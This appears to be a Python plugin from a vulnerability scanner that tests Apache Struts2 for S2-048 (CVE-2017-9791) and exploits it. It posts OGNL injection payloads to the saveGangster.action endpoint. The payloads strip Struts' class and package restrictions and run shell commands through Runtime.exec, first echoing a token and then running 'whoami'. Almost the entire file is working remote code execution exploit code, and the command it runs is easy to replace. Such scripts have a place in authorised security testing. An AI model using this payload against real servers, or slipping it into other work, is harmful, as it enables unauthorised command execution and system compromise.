#!/usr/bin/env python3

'''
name: Struts2 S2-048漏洞，又名CVE-2017-9791漏洞
description: Struts2 S2-048漏洞可执行任意命令
'''

import os
import re
import json
import time
import urllib
from urllib import parse
from app.lib.utils.common import get_capta
from app.lib.utils.request import request

class S2_048_BaseVerify:
    def __init__(self, url):
        self.url = url
        self.capta = get_capta() 
        self.headers = {
                   'User-Agent': "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36 115Browser/6.0.3",
                   'Content-Type': "application/x-www-form-urlencoded",
                   'Connection': "keep-alive",
                  }
        self.check_data = {
                'name': "%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(" +'\'' + 'echo' + ' ' + self.capta + '\'' + ").getInputStream())).(#q)}",
                'age': "test",
                'bustedBefore': "true",
                '__checkbox_bustedBefore': "true",
                'description': "test"
               }
        self.check_data = parse.urlencode(self.check_data).encode('utf-8')
        self.cmd_data = {
                'name': "%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('whoami').getInputStream())).(#q)}",
                'age': "test",
                'bustedBefore': "true",
                '__checkbox_bustedBefore': "true",
                'description': "test"
               }
        self.cmd_data = parse.urlencode(self.cmd_data).encode('utf-8')
    
    def run(self):
        if not self.url.startswith("http") and not self.url.startswith("https"):
            self.url = "http://" + self.url
        if  '.action' not in self.url:
            self.url = self.url + '/integration/saveGangster.action'
        try:
            check_req = request.post(self.url, headers = self.headers, data = self.check_data)
            if self.capta in check_req.text:
                cmd_req = request.post(self.url, headers = self.headers, data = self.cmd_data)
                cmd_str = re.sub('\n', '', cmd_req.text)
                result = re.findall('Gangster (.*?) added successfully', cmd_str)
                print('存在S2-048漏洞,执行whoami命令成功，其结果为:', result)
                return True
            else:
                print('不存在S2-048漏洞')
                return False
        except Exception as e:
            print(e)
            return False
        finally:
            pass
        
       

if  __name__ == "__main__":
    S2_048 = S2_048_BaseVerify('http://192.168.30.242:8080')
    S2_048.run()



